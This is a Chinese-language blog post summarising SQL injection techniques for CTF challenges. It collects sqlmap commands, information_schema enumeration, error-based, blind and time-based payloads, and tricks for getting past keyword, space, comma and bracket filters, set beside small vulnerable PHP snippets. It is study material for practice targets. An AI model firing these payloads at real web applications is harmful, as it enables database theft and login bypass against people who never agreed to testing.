---
title: CTF 中的 SQL 注入总结
layout: post
category: [CTF]
tagline: 
show_reward: true
tags: [SQL注入, CTF]
---


## flag 常见表

```
select flag from flag
```

## SQL 注入的基本原理

```
select * from user where username='' and pass=''
# 构造 username=devnull' or '1后，sql 语句变成
select * from user where username='devnull' or '1' and pass=''
```

## SQLMap

```
python sqlmap.py -u "http://192.168.1.2/get_info.php?title=xxx&order=id" --current-db --batch --flush --tables
```

自定义的注入位置，用 * 号表示，如 header 的x-forwarded-for 注入

```
python sqlmap.py -u "http://192.168.118.142/" --headers="X-Forwarded-For: *" --banner
```

## MySQL中的注释符

- `#` 注释从#字符到行尾
- `--` 注释从--序列到行尾，后面需要跟上一个或多个空格，tab也可以
- `/* */` 注释中间的字符


## 获取元数据

```sql
# 获取当前的数据库用户，数据库名称，数据库的版本信息
select user(),database(),version() from dual;
# 查询数据库，有时需要限制返回的数量，或者偏移，例如页面只显示一条数据的情况 limit 0,1 limit 1,2
# 需要通过偏移来返回所有的数据库
select schema_name from information_schema.schemata;
# group_concat 函数是将多行数据连接成一行
select group_concat(schema_name) from information_schema.schemata;
# 查询表
# 方法1
select group_concat(table_name) from information_schema.tables where table_schema=database();  
# 方法2
select table_name from information_schema.tables where table_schema='database_name';
# 方法3
select table_name from information_schema.tables where table_schema=(select database());

# 查询列
select column_name from information_schema.columns where table_schema='database_name' and table_name='users';
select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag';

# 上面可能会被waf识别，也可以这样
select group_concat(column_name) from information_schema.columns where table_name='users';

# 字符串可以转换成16进制
select concat(group_concat(distinct+column_name)) from information_schema.columns where table_name=0x696e666f;
```

## 报错注入的一些技巧

### 用不存在的函数，爆出数据库名

如果过滤了 information_schema，也就无从获取表名和字段信息了，但是如果开启了报错，根据 MySQL 的特性，用一个不存在的自定义函数，就可以爆出数据库名。

```sql
SELECT * from users t where t.username=a()
// 报错信息，数据库名是 test_db
[Err] 1305 - FUNCTION test_db.a does not exist
```

### 利用 linestring 函数，爆出当前表名

```
SELECT * from users where id=1 and linestring(id)
// 报错信息，当前表名是 users
[Err] 1367 - Illegal non geometric '`test_db`.`users`.`id`' value found during parsing
```

### 使用 using+join 获取字段名

```
SELECT * from users where id=1 union select * from (select * from users as A join users as B using(id)) as C
// 报错信息，爆出列名 username
[Err] 1060 - Duplicate column name 'username'
using中增加新的列名，可以继续爆出其它列名，直到没有报错信息
SELECT * from users where id=1 union select * from (select * from users as A join users as B using(id,username)) as C
// 报错信息，又爆出一个列名
[Err] 1060 - Duplicate column name 'password'
```

## 判断字段的数量

```
# 原始的
http://192.168.137.140/cms/show.php?id=35
# 后面加上 order by 数字，就会按照第几个字段进行排序，如果没有会报错
http://192.168.137.140/cms/show.php?id=35 order by 16
```

## union查询

```
# mysql执行：语句正常；
# mssql执行：语句错误，数据类型不匹配，无法正常执行
select id,username from users union select 1,2;     

# oracle执行：语句错误，数据类型不匹配
select id,username from users union select 1,2 from dual;  
```

遇到 union 错误

```
# 遇到 Illegal mix of collations for operation 'UNION'
http://192.168.137.140/cms/show.php?id=999 union select 1,2,group_concat(schema_name) from information_schema.schemata
# 是编码有问题，可以替换成
http://192.168.137.140/cms/show.php?id=999 union select 1,2,hex(group_concat(schema_name)) from information_schema.schemata

# 返回的结果是16进制，转换一下就可以了
```

## 绕过过滤

```
$check= eregi('select|insert|update|delete|from|or|and|=|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $pass);
```
- and 用 && 代替
- or 用 || 代替
- union select from 变成 `/*!union*/` 这种

### 空格绕过

```
// 使用括号，select, from , where 这些关键字不能用括号
select(table_name)from(information_schema.tables)where(table_schema)=database()
// 使用内联注释
select/*1*/username/*1*/from/*1*/users
// 使用%0a 绕过
```

### 关键字写两次

用 seselectlect 可以绕过

```php
preg_replace('/select|union|from|where|insert|update/i','',$username)
```

### 大小写绕过

用 SELECT 可以绕过

```php
preg_replace('/select|union|from|where|insert|update/','',$username)
```

### 16进制绕过

mysql中字符串都可以转换成对应的16进制形式。

例如：

`1 or 1` == `0x31206f722031`

利用前提：

1、insert插入时对应字段为字符类型（varchar、char等等）
2、SQL语句values时不允许存在单引号。

例句：

```
insert into xiaol(id, address) values(1, 0x31206f722031)
```

### 碰到 “=” 等于号被过滤的情况。

我们知道 = 号，在mysql中常用条件查询（过滤的了话）。可以使用其他条件来进行判断

可以使用 <> 不等于，也可以改用 like

```
1' || username like 0x61646d696e)#
# 16进制转换后为，发现admin前后不能加'，否则会找不到数据
1' || username like admin)#
```

这里就直接使用了like，(这里说一下小技巧，有时候想 like 模糊查询下，但是有单引号，那么我可以这样写： like 0x2725302d662e6f72672527 （’%0-f.org%’）)

regexp 后面的参数也可以使用16进制

### regexp 和 like 

当 select 和 () 被过滤的时候，可以用 regexp 和 like 盲注出当前表的字段值

like 使用 % 和 _ 作为通配符，因此这两个字符无法匹配，需要结合 regexp 搭配使用

- % 表示任意个或多个字符。可匹配任意类型和长度的字符。
- _ 表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句（可以代表一个中文字符）

regexp 在使用的时候要加上 '^' 这个前缀，例如 '^abc'


regexp 和 like 在查询的时候默认都是不区分大小写的

```
# 不区分大小写
select * from table_name where a like 'a%'
select * from table_name where a regexp '^a'

# 区分大小写
select * from table_name where binary a like 'a%'
select * from table_name where binary a regexp '^a'
```

### 碰到 “,” 逗号被过滤的情况.

- SUBSTR(password FROM 3 FOR 1) 等同于SUBSTR(PASSWORD,3,1)
- SUBSTR(password FROM 2) 等同于 SUBSTR(PASSWORD,2)
- substr(database()from(3)for(1)) 等同于 mid(database()from(3)for(1))
- limit 1,1 中的逗号用limit 1 offset 1

使用 join

```
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;
```

### 括号被过滤的情况

在盲注中，如果过滤了括号()，那么将无法使用substr等函数，于是无法正常的逐字节读取字段内容，此时可以使用

```
SELECT * FROM users WHERE name NOT REGEXP '^h'
SELECT * FROM users WHERE name NOT REGEXP '^hh'
SELECT * FROM users WHERE name NOT REGEXP '^hhh'
```

根据盲注的结果，判断字段是否和某个正则表达式匹配，这样逐字节判断字段的值。

regexp相当于rlike，使用REGEXP，NOT REGEXP，RLIKE，NOT RLIKE绕过对括号的过滤


### 过滤空格
- 控制字符替代法 %20 %09 %0A %0B %0C %0D %A0 
- 符号替代法 /**/、select.``.password、select+user()
- 括号组合法 union(select(1),2)、select{x(password)}from{x(user)}

### 连续运算绕过

使用连续等号
```
SELECT * from users where username='-1'='' and password='-1'=''
```

从左到右运算，先计算username='-1'，一般数据库里不会有'-1'，故该值为0。再计算0=''，得到值为1。password='-1'=''同理。

也可以使用异或的方式，原理与连续等号相同

```
SELECT * from users where username=admin'^(substring((select(user()))from(1))='a')^'1'
```

### union  select from

只要按照union  select from 的顺序出现，就被过滤

```
/union([\s\S]+)select([\s\S]+)from/i
```

绕过方法

```
id=1=2|@c:=(select(1))union(select@c)
```

读目录的exp为

```
id=1=2|@c:=(select(flag)from(flag)where(flag<0x30))union(select@c)
```

## 延时注入

```
/test/query.php?name=sadf' AND 7352=IF((ORD(MID((SELECT IFNULL(CAST(KeyIsMe AS CHAR),0x20) FROM example.__key__ ORDER BY ID LIMIT 0,1),18,1))>50),BENCHMARK(1000000,MD5(0x4b654d45)),7352)
```

```
/test/query.php?name=sadf' AND 7352=IF((ORD(MID((SELECT IFNULL(CAST(KeyIsMe AS CHAR),0x20) FROM example.__key__ ORDER BY ID LIMIT 0,1),18,1))>50),SLEEP(5),7352)
```

## limit 注入
MySQL 5.x 到 5.6.6

```
SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
```

如果不支持报错注入的话，还可以基于时间注入：

```
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

直接使用sleep不行，需要用BENCHMARK代替。 

## updatexml 报错注入

如果测试的时候有提示出错信息，可以考虑使用报错注入

```
show coulumns 出错:Table 'inject_3333.article_test'' doesn't exist
```

使用的语句

```
http://www.xxx.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```
0x7e 是 ~。因为 UPDATEXML 第二个参数需要 Xpath 格式的字符串，如果不符合要求，会报错，错误大概会是：

```
ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’
```

这里 updatexml 里面第2个参数，不能使用 group_concat，因为 group_concat 是针对 select group_concat(column_name) 的

一些例子

```
# 遇到 show columns 后面要用 where 连接，不能用 and 
show COLUMNS FROM test_db.users where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```
## show columns 注入

代码大概如下

```php
mysql_query("show columns from `shop_{$table}`") or die("show coulumns 出错:".mysql_error());
```
show columns 语法

```
SHOW [FULL] COLUMNS {FROM | IN} tbl_name [{FROM | IN} db_name]
    [LIKE 'pattern' | WHERE expr]
```

利用报错注入

```
table=123` where updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)#
```

## group by with rollup

group by with rollup （对分组后的结果进行汇总），with rollup 会对 group by 的列，在最后多出一个 NULL 的值

```php
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
    print "一颗赛艇！";
}
```

payload

```
# limit 1 offset 2 是需要不断测试，猜测出表中一共有几条数据，最后一条 pwd 的值为 null
uname='or 1 group by pwd with rollup limit 1 offset 2#
```

## desc 

desc 是数据库的操作命令，可以列出表或者字段的定义，desc 后可以跟 `表名 [列名]`，表名必须正确，而`列名则不必须`。

```
desc tablename filedname
desc `tablename` `filedname`
```

例如这种情况下，可以在列名处构造 payload 实现绕过

```php
// payload: test` `where 0 union select *  from secret_test
$table = $_GET['table']?$_GET['table']:"test";
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
```

第1条SQL语句

```
desc `secret_test` `where 0 union select *  from secret_test`
```

第2条SQL语句

```
// 这里 ` ` 是 secret_test 表的别名
select 'flag{xxx}' from secret_test` `where 0 union select *  from secret_test
```

## order by 注入

order by 后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于 order by 后面不可以跟union，一般利用盲注。order by 后面可以跟列名，如果不存在会报错，可以用来猜测列名。

sleep 盲注

```sql
order by name, if(1=1,name,price)
order by name, if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) // 正常响应时间
order by name, if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) // sleep 2秒
select id,name,price from book order by if(1=1,sleep(0),sleep(1));
```

利用报错

在有些情况下无法知道列名，而且也不太直观的去判断两次请求的差别，如下用IF语句为例。

```
order by IF(1=1,1,(select 1 union select 2)) 正常
order by IF(1=2,1,(select 1 union select 2)) 错误
order by IF(1=1,1,(select 1 from information_schema.tables)) 正常
# 会报错误 Subquery returns more than 1 row
order by IF(1=2,1,(select 1 from information_schema.tables)) 错误
```

## where 比较条件弱类型

字符串与0进行比较的时候会转成数字，跟PHP的弱类型相同

```
# 如果是数字开头的，则会变成前面的字符串 
'123abc' == 123
'abc' == 0
# 可以把username不以数字开头的数据取出来
select * from users WHERE username=0;

#  'abc' + 0 为 0
select 'abc' + 0;
#  'abc' + 123 为 123
select 'abc' + 123;
# 'abc' + '0' 为 0，做加法运算的时候，两边都变成数字 
select 'abc' + '0';
```

可以获取所有用户名和密码不为0的数据，利用这种方式可以构造万能密码

```sql
select * from users where username=0 and password=0
select * from users where username='abcd' + '0' and password='abc' + '0'
```


## 不知道列名时的注入

### 方法1

在无法通过 information_schema 查询列名时，如果存在 SQL 错误回显，可以使用如下方法查询出列名。

```
select * from users where username='admin' and (select * from (select * from users as a join users as b using(username)) as c)

// 会显示这些错误信息
[Err] 1060 - Duplicate column name 'password'
```

当做 join 操作时，如果两个表都有相同的字段，可以使用 using，这样可以少写 SQL 语句，因为使用了 using，两个相同的表做 join 时，using 里面的字段只会保留一个，但是另外在using里面的，就会出现两个，导致出现 Duplicate column。
如果是使用 join on，则是会把所有的列都保留，也就是这里会有两个相同的 id，name, password，因为报错只显示第一个错误，会提示 Duplicate column name 'id'。

### 方法2

是用两个 select union 的方式，目标的表用 select  * 查询出所有的列，然后另外一个表使用 select 1,2 as c，利用别名的方式，为该序号的列定义了一个列名，由于有 union，两个表在该序号的列就可以使用新的列名，然后外层 select 使用新的列名查询出来。

```
select c from (select 1,2 as c union(select * from users)) as b
// 别名的另外一种方法，不使用 as
select c from (select 1,2`c` union(select * from users))`b`
```

## 一些函数

### exists 

判断是否存在

```
exists(select * from admin)
```

## ASP 的网站

遇到 asp 的网站，发现有在url中获取id参数，那么也可能会从Cookie中获取，可以尝试 Cookie 注入


```
sqlmap -u "http://10.10.1.202/shownews.asp?id=83" --level=2 --risk=3 --cookie="id=82" --current-db --tables --batch
```

## SQLite

输入 ''' 看到如下数据，可以判断是 sqlite 数据库

```
unrecognized token: "202cb962ac59075b964b07152d234b70"
```


